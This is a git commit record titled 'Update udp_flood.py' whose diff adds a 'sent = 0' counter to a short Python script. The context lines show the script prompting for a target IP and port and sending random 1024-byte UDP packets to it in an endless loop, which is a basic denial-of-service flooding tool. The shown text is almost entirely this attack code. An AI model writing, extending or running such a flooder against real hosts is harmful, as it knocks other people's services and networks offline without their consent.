9358ca2c37ee680be9756da52d8971e012220731
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-10-26 09:10:00 -0400

    Update udp_flood.py

--- udp_flood.py
+++ udp_flood.py
@@ -5,6 +5,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 ip = raw_input('Target IP: ')
 port = input('Port: ')
+sent = 0
 
 while 1:
   sock.sendto(bytes,(ip,port))
